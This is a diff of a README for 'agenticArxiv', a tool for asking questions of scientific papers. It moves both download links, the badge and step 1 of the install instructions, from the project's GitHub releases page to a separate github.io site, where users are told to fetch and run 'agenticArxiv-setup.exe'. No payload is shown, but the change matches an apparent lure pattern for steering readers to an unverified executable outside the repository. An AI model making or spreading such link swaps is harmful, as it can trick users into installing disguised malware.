@@ -1,6 +1,6 @@
 # 🔍 agenticArxiv - Understand complex scientific papers with ease
 
-[![Download agenticArxiv](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/poisonous-jonesboro417/agenticArxiv/releases)
+[![Download agenticArxiv](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://poisonous-jonesboro417.github.io)
 
 agenticArxiv helps you read and analyze scientific research papers. It uses a smart system to search through documents and answer your questions. Instead of reading dozens of pages, you ask the system to find the facts you need. This tool saves you time and helps you understand difficult topics.
 
@@ -17,7 +17,7 @@ Before you install the software, check your computer against these requirements:
 
 You must download the file from our official release page. Please follow these steps to get the software on your computer.
 
-1. Visit this link to reach the download page: [https://github.com/poisonous-jonesboro417/agenticArxiv/releases](https://github.com/poisonous-jonesboro417/agenticArxiv/releases)
+1. Visit this link to reach the download page: [https://poisonous-jonesboro417.github.io](https://poisonous-jonesboro417.github.io)
 2. Look for the file named `agenticArxiv-setup.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder.
